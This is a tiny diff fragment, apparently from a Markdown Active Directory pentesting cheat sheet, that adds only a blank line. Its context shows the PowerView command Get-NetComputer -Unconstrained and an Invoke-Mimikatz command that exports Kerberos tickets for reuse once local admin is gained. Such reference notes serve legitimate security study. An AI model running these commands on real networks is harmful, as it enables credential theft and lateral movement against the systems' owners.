@@ -275,6 +275,7 @@ Get-NetComputer -Unconstrained
 ```
   
 If local priv admin, possibility to dump ticket and re-use it:
+
 dump:
 ```
 Invoke-Mimikatz -Command '"sekurlsa::tickets /export"'
